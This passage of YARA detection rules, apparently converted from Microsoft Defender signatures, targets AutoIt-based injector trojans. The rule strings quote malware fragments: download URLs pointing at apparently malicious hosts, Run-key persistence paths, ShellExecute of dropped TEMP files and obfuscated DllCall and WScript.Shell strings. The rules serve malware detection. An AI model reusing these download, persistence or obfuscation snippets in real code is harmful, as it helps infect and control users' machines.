        $x_1_2 = "WINWAITACTIVE ( $Z3338OV0YC , \"nbSuWsG9i\" , 2555 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RF_2147900181_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RF!MTB"
        threat_id = "2147900181"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= [ \"LmwIJMGUM\\LmwIJMGUM.exe\" , \"LmwIJMGUM\\" ascii //weight: 1
        $x_1_2 = "TCPSTARTUP <> TCPNAMETOIP" ascii //weight: 1
        $x_1_3 = "DRIVEGETDRIVE <> SHELLEXECUTE" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RF_2147900181_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RF!MTB"
        threat_id = "2147900181"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Windows\\CurrentVersion\\Explorer\\Advanced\" , \"HideFileExt\"" ascii //weight: 1
        $x_1_2 = "RUN ( @WINDOWSDIR & \"\\svhost.exe\" ) )" ascii //weight: 1
        $x_1_3 = "STRING ( RANDOM ( 1 , 10 ) )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RF_2147900181_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RF!MTB"
        threat_id = "2147900181"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "$A31333431SKZD [ 6 ] = [ 170 / 2 , 33 + 33 , 188 + -77 , 84 + 33 , 1650 / 15 , 34 + 66 ]" ascii //weight: 1
        $x_1_2 = "= STRINGFROMASCIIARRAY ( $A31333431SKZD )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RF_2147900181_6
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RF!MTB"
        threat_id = "2147900181"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DIRCREATE ( \"KyzfoPECz0\" )" ascii //weight: 1
        $x_1_2 = "STRINGREGEXPREPLACE ( \"uuiNN4Bl8\" , \"dFyKBLBi\" , \"Z9kL7WKZbk\" )" ascii //weight: 1
        $x_1_3 = "WINMOVE ( \"2APCvd3NXj\" , \"64\" , 641 , 561 , 199 , 612 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RF_2147900181_7
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RF!MTB"
        threat_id = "2147900181"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "$STEMPNAME &= CHR ( RANDOM ( 97 , 122 , 1 ) )" ascii //weight: 1
        $x_1_2 = "SHELLEXECUTE ( $F )" ascii //weight: 1
        $x_1_3 = "$DOWNLOAD_URL = \"http://172.104.65.137/explorer.exe" ascii //weight: 1
        $x_1_4 = "$EX = @TEMPDIR & \"\\explorer.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RF_2147900181_8
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RF!MTB"
        threat_id = "2147900181"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FUNC TOUMATGQXUNGMDO ( )" ascii //weight: 1
        $x_1_2 = "BITROTATE <> BITXOR" ascii //weight: 1
        $x_1_3 = "ZQTGYAQBJ ( $QRJXDNIAA [ 0 ] , $QRJXDNIAA [ $STJRUKKWB ] )" ascii //weight: 1
        $x_1_4 = "FOR $STJRUKKWB = 0 TO 1" ascii //weight: 1
        $x_1_5 = "BITSHIFT <> SPLASHTEXTON" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RG_2147901484_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RG!MTB"
        threat_id = "2147901484"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DIM $LMOYRITOI [ 2 ] = [ \"tUjZjRkQo.exe\"" ascii //weight: 1
        $x_1_2 = "BITROTATE <> BINARY" ascii //weight: 1
        $x_1_3 = "PVMKXXPOQ ( $LMOYRITOI [ 0 ]" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RG_2147901484_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RG!MTB"
        threat_id = "2147901484"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "STRINGREGEXPREPLACE ( \"udH\" , \"3mWA95Amnd\" , \"JoPuRsy4F\" )" ascii //weight: 1
        $x_1_2 = "INIDELETE ( \"AOtNZ6qGWz\" , \"A8c0G9WMg7\" , \"yM6DmlfXS6\" )" ascii //weight: 1
        $x_1_3 = "WINMENUSELECTITEM ( \"MiKhuZq2\" , \"rQT4UZQsHs\" , \"default\" )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RH_2147901485_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RH!MTB"
        threat_id = "2147901485"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {08 95 70 1c f1 48 6d fa ab 82 0c dd e4 31 68 46 bc 77 a1 09 af d8 d0 85 05 fa 8d 48 b5 77 09 85}  //weight: 1, accuracy: High
        $x_1_2 = {fd 71 bc c3 f2 48 c7 9e e8 f2 f8 8d b0 f5 3e f6 5b f0 ed 42 9b f2 7e 1a be 26 aa 35 84 e6 ec 80}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AMB_2147902382_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMB!MTB"
        threat_id = "2147902382"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {44 00 6c 00 6c 00 43 00 61 00 6c 00 6c 00 28 00 [0-20] 28 00 22 00 22 00 6b 00 73 00 35 00 35 00 73 00 63 00 65 00 73 00 35 00 35 00 73 00 63 00 72 00 73 00 35 00 35 00 73 00 63 00 6e 00 73 00 35 00 35 00 73 00 63 00 65 00 73 00 35 00 35 00 73 00 63 00 6c 00 73 00 35 00 35 00 73 00 63 00 33 00 73 00 35 00 35 00 73 00 63 00 32 00 73 00 35 00 35 00 73 00 63 00 2e 00 73 00 35 00 35 00 73 00 63 00 64 00 73 00 35 00 35 00 73 00 63 00 6c 00 73 00 35 00 35 00 73 00 63 00 6c 00 73 00 35 00 35 00 73 00 63 00 22 00 22 00 29 00 2c 00 20 00 00 28 00 22 00 22 00}  //weight: 2, accuracy: Low
        $x_2_2 = {44 6c 6c 43 61 6c 6c 28 [0-20] 28 22 22 6b 73 35 35 73 63 65 73 35 35 73 63 72 73 35 35 73 63 6e 73 35 35 73 63 65 73 35 35 73 63 6c 73 35 35 73 63 33 73 35 35 73 63 32 73 35 35 73 63 2e 73 35 35 73 63 64 73 35 35 73 63 6c 73 35 35 73 63 6c 73 35 35 73 63 22 22 29 2c 20 00 28 22 22}  //weight: 2, accuracy: Low
        $x_1_3 = "us55scss55sces55scrs55sc3s55sc2s55sc" ascii //weight: 1
        $x_1_4 = "\"s55sc\" , \"\"" ascii //weight: 1
        $x_1_5 = "@TEMPDIR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_KAA_2147902504_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.KAA!MTB"
        threat_id = "2147902504"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {85 94 98 79 41 55 33 21 45 41 30 36 4d a8 ff 73 24 a7 3c f6 7a 12 f1 67 ac c1 93 e7 6b 43 ca 52 a6 ad}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AMC_2147902652_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMC!MTB"
        threat_id = "2147902652"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {44 00 6c 00 6c 00 43 00 61 00 6c 00 6c 00 28 00 [0-20] 28 00 22 00 22 00 6b 00 38 00 67 00 76 00 32 00 76 00 65 00 38 00 67 00 76 00 32 00 76 00 72 00 38 00 67 00 76 00 32 00 76 00 6e 00 38 00 67 00 76 00 32 00 76 00 65 00 38 00 67 00 76 00 32 00 76 00 6c 00 38 00 67 00 76 00 32 00 76 00 33 00 38 00 67 00 76 00 32 00 76 00 32 00 38 00 67 00 76 00 32 00 76 00 2e 00 38 00 67 00 76 00 32 00 76 00 64 00 38 00 67 00 76 00 32 00 76 00 6c 00 38 00 67 00 76 00 32 00 76 00 6c 00 38 00 67 00 76 00 32 00 76 00 22 00 22 00 29 00 2c 00 20 00 00 28 00 22 00 22 00}  //weight: 2, accuracy: Low
        $x_2_2 = {44 6c 6c 43 61 6c 6c 28 [0-20] 28 22 22 6b 38 67 76 32 76 65 38 67 76 32 76 72 38 67 76 32 76 6e 38 67 76 32 76 65 38 67 76 32 76 6c 38 67 76 32 76 33 38 67 76 32 76 32 38 67 76 32 76 2e 38 67 76 32 76 64 38 67 76 32 76 6c 38 67 76 32 76 6c 38 67 76 32 76 22 22 29 2c 20 00 28 22 22}  //weight: 2, accuracy: Low
        $x_1_3 = "u8gv2vs8gv2ve8gv2vr8gv2v38gv2v28gv2v.8gv2vd8gv2vl8gv2vl8gv2v" ascii //weight: 1
        $x_1_4 = "\"8gv2v\" , \"\"" ascii //weight: 1
        $x_1_5 = "@TEMPDIR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AMBG_2147902654_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMBG!MTB"
        threat_id = "2147902654"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {c9 38 6e a5 c9 a1 2f b0 88 a6 fd a2 89 6f e6 6b a0 28 ee 92 37 c4 a3 ae 9b 5d 72 b3 cd 21 0e 4f de ed 27 0a 91 15 e8 b6 b0 57 6a 8b 0c 39 41 91}  //weight: 1, accuracy: High
        $x_1_2 = {79 f8 1d bc 70 ef 9a 68 74 6f 21 44 38 a8 a7 a3 fe fe ca 11 a9 98 3c ba 92 b2 e2 54 b9 da 69 2f e5 aa 92 22 e9 b4 34 43 78 16 0a e6 69 4a 1c 6e}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AMD_2147903061_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMD!MTB"
        threat_id = "2147903061"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {44 00 6c 00 6c 00 43 00 61 00 6c 00 6c 00 28 00 [0-20] 28 00 22 00 22 00 6b 00 74 00 63 00 79 00 64 00 78 00 65 00 74 00 63 00 79 00 64 00 78 00 72 00 74 00 63 00 79 00 64 00 78 00 6e 00 74 00 63 00 79 00 64 00 78 00 65 00 74 00 63 00 79 00 64 00 78 00 6c 00 74 00 63 00 79 00 64 00 78 00 33 00 74 00 63 00 79 00 64 00 78 00 32 00 74 00 63 00 79 00 64 00 78 00 2e 00 74 00 63 00 79 00 64 00 78 00 64 00 74 00 63 00 79 00 64 00 78 00 6c 00 74 00 63 00 79 00 64 00 78 00 6c 00 74 00 63 00 79 00 64 00 78 00 22 00 22 00 29 00 2c 00 20 00 00 28 00 22 00 22 00}  //weight: 2, accuracy: Low
        $x_2_2 = {44 6c 6c 43 61 6c 6c 28 [0-20] 28 22 22 6b 74 63 79 64 78 65 74 63 79 64 78 72 74 63 79 64 78 6e 74 63 79 64 78 65 74 63 79 64 78 6c 74 63 79 64 78 33 74 63 79 64 78 32 74 63 79 64 78 2e 74 63 79 64 78 64 74 63 79 64 78 6c 74 63 79 64 78 6c 74 63 79 64 78 22 22 29 2c 20 00 28 22 22}  //weight: 2, accuracy: Low
        $x_1_3 = "utcydxstcydxetcydxrtcydx3tcydx2tcydx.tcydxdtcydxltcydxltcydx" ascii //weight: 1
        $x_1_4 = "\"tcydx\" , \"\"" ascii //weight: 1
        $x_1_5 = "@TEMPDIR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_RJ_2147903140_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RJ!MTB"
        threat_id = "2147903140"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FILESETTIME ( \"y78JvjaH\" , \"hVWzAeQ\" , 145 )" ascii //weight: 1
        $x_1_2 = "FILESAVEDIALOG ( \"MtPkWi\" , \"i\" , \"CYV0Nwm\" , \"vraQt\"" ascii //weight: 1
        $x_1_3 = "FILEWRITELINE ( 414 , \"ah90WDgUx\" )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RK_2147903141_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RK!MTB"
        threat_id = "2147903141"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FILEMOVE ( \"8DQhilug\" , \"9elx\" , 554 )" ascii //weight: 1
        $x_1_2 = "WINWAITNOTACTIVE ( \"hTTNh\" , \"LrO\" , 809 )" ascii //weight: 1
        $x_1_3 = "DIRCOPY ( \"fIWCGBiuok\" , \"MnekZj\" , 557 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RL_2147903142_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RL!MTB"
        threat_id = "2147903142"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "TOOLTIP ( \"lipYb2vE\" , 579 , 969 , \"mkGG23\" )" ascii //weight: 1
        $x_1_2 = "FILESELECTFOLDER ( \"vZvjMT6i\" , \"jU2riM\" , 379 , \"Epass\" )" ascii //weight: 1
        $x_1_3 = "WINGETPROCESS ( \"KiCp6R6C\" , \"BA1ft24k\" )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_ASA_2147903146_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ASA!MTB"
        threat_id = "2147903146"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " STRINGREGEXPREPLACE ( $C3030RIEQAZ , \"ZqaxuT\" , $M33ATKX4 )" ascii //weight: 1
        $x_1_2 = " $X32373831CP0 = DLLCALL ( U3130F2EA ( \"mgtpgn54\" , 2 )" ascii //weight: 1
        $x_1_3 = " $X32373831CP0 = EXECUTE ( \"$X32373831CP0\" & U3130F2EA ( \"]2_\" , 2 ) )" ascii //weight: 1
        $x_1_4 = " $J32373738GGTHRH = FILEREAD ( FILEOPEN ( @TEMPDIR & \"\\sulfhydric\" ) )" ascii //weight: 1
        $x_1_5 = " STRINGREGEXPREPLACE ( \"rsiai\" , $F3189KCR3Q , \"TvnOuz5YiJ\" )" ascii //weight: 1
        $x_1_6 = " $U323438369O = FILEREAD ( FILEOPEN ( @TEMPDIR & \"\\Grinnellia\" ) )" ascii //weight: 1
        $x_1_7 = " $N32343931S6NZAM6 = EXECUTE ( \"$N32343931s6NZam6[0]\" )" ascii //weight: 1
        $x_1_8 = " LOCAL $N32343931S6NZAM6 = DLLCALL ( BINARYTOSTRING ( \"0x6B65726E656C3332\" ) " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Trojan_Win32_AutoitInject_ASB_2147903147_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ASB!MTB"
        threat_id = "2147903147"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " $M313138380K = FILEREAD ( FILEOPEN ( @TEMPDIR & \"\\emboweling\" ) )" ascii //weight: 1
        $x_1_2 = " $V31313737KQWPP1W &= EXECUTE ( \"Chr($L313138308bMKVg)\" )" ascii //weight: 1
        $x_1_3 = " DLLCALL ( F341HF ( \"tn{wnu<;\" , 9 ) " ascii //weight: 1
        $x_1_4 = " $K31383430TUY = FILEREAD ( FILEOPEN ( @TEMPDIR & \"\\subpredication\" ) )" ascii //weight: 1
        $x_1_5 = " LOCAL $C31383437CD4C = DLLCALL ( R37WFON0L ( \"uo|xov=<\" , 10 )" ascii //weight: 1
        $x_1_6 = " $C31383437CD4C = EXECUTE ( \"$C31383437cd4C[0]\" )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Trojan_Win32_AutoitInject_ASC_2147903150_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ASC!MTB"
        threat_id = "2147903150"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " DIRCOPY ( \"tPX5\" , $V31EDFZDNFV , 550 )" ascii //weight: 1
        $x_1_2 = " REGDELETE ( \"WFhRMWHexn\" , \"xAyLL4874o\" )" ascii //weight: 1
        $x_1_3 = " FILEMOVE ( \"GDFZp5JS\" , \"qdqOKcP\" , 218 )" ascii //weight: 1
        $x_1_4 = " DLLCALL ( W377HYKP ( \"qkxtkr98\" , 6 ) , W377HYKP ( \"vzx\" , 6 )" ascii //weight: 1
        $x_1_5 = " DLLCALL ( H39NZSX ( \"cmjv]t+:\" , 8 ) , H39NZSX ( \"h|j\" , 8 ) , H39NZSX ( \"Nqj|midIdtgk\" , 8 )" ascii //weight: 1
        $x_1_6 = " DIRCOPY ( \"vvzJo4nb\" , \"H2yNHayk9J\" , 645 )" ascii //weight: 1
        $x_1_7 = " FILEMOVE ( \"nUNSTg\" , \"rwM3Pn\" , 923 )" ascii //weight: 1
        $x_1_8 = " STRINGREGEXPREPLACE ( \"SFB9C\" , \"wiu5GTuPib\" , $K30KANA )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Trojan_Win32_AutoitInject_ASD_2147903151_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ASD!MTB"
        threat_id = "2147903151"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = " STRINGREGEXPREPLACE ( \"HJk6NXK0N\" , \"l6xMrQnYD\" , \"OqzJm6\" )" ascii //weight: 1
        $x_1_2 = " DLLCALL ( B387PQ ( \"smzvmt;:\" , 8 ) , B387PQ ( \"x|z\" , 8 ) , B387PQ ( \"^qz|}itIttwk\" , 8 )" ascii //weight: 1
        $x_1_3 = " FILEWRITELINE ( 205 , \"j3mb7jONh\" )" ascii //weight: 1
        $x_1_4 = " FILESETTIME ( \"vMsF\" , \"g\" , 61 )" ascii //weight: 1
        $x_1_5 = " DLLCALL ( V37TL64 ( \"qkxtkr98\" , 6 ) , V37TL64 ( \"vzx\" , 6 ) , V37TL64 ( \"\\oxz{grGrrui\" , 6 )" ascii //weight: 1
        $x_1_6 = " FILEWRITELINE ( 498 , \"dYSq9b9\" )" ascii //weight: 1
        $x_1_7 = " FILESETTIME ( \"SAtNFQsjl9\" , \"FR6iBN\" , 421 )" ascii //weight: 1
        $x_1_8 = " DIRCREATE ( \"VdVqk5W\" )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Trojan_Win32_AutoitInject_GPAA_2147903248_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.GPAA!MTB"
        threat_id = "2147903248"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SHELLEXECUTE ( \"http" ascii //weight: 1
        $x_1_2 = "SHELLEXECUTE ( \"msedge.exe\" , \"https" ascii //weight: 1
        $x_1_3 = "SHELLEXECUTE ( \"chrome.exe\" , \"https" ascii //weight: 1
        $x_1_4 = "SHELLEXECUTE ( \"firefox.exe\" , \"http" ascii //weight: 1
        $x_1_5 = "SLEEP ( 60 * 20 * 1000 )" ascii //weight: 1
        $x_1_6 = "SLEEP ( 60 * 10 * 1000 )" ascii //weight: 1
        $x_1_7 = "UNTIL 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_GPB_2147904686_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.GPB!MTB"
        threat_id = "2147904686"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "wotkl.ru/wp-content/cache/blogs/imagem01.exe" ascii //weight: 5
        $x_1_2 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii //weight: 1
        $x_1_3 = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_GPD_2147904687_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.GPD!MTB"
        threat_id = "2147904687"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "115,99,114,105,112,116,46,83,108,101,101,112" ascii //weight: 1
        $x_1_2 = "114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110" ascii //weight: 1
        $x_5_3 = "104,116,116,112,58,47,47,119,119,119,46,57,54,56,56,46,108,97,47,63,120,99,99" ascii //weight: 5
        $x_5_4 = "runner=runner&chr(strs" ascii //weight: 5
        $x_5_5 = "Execute runner" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 2 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_KAB_2147906224_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.KAB!MTB"
        threat_id = "2147906224"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "STRINGSPLIT" ascii //weight: 1
        $x_1_2 = "SHELLEXECUTE ( @WORKINGDIR & CHR" ascii //weight: 1
        $x_1_3 = "TO ( STRINGLEN" ascii //weight: 1
        $x_1_4 = "& CHR ( 92 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_JNAA_2147906439_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.JNAA!MTB"
        threat_id = "2147906439"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "sdxitong.exe" ascii //weight: 2
        $x_1_2 = "BITXOR ( $A03A4B13659 , 512 )" ascii //weight: 1
        $x_1_3 = "BITXOR ( $A03A4B13659 , 1024 )" ascii //weight: 1
        $x_1_4 = "SHELLEXECUTE ( @TEMPDIR )" ascii //weight: 1
        $x_1_5 = "://xiaohei.xiuchufang.com/config.txt" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_KTAA_2147908315_0
{
    meta:
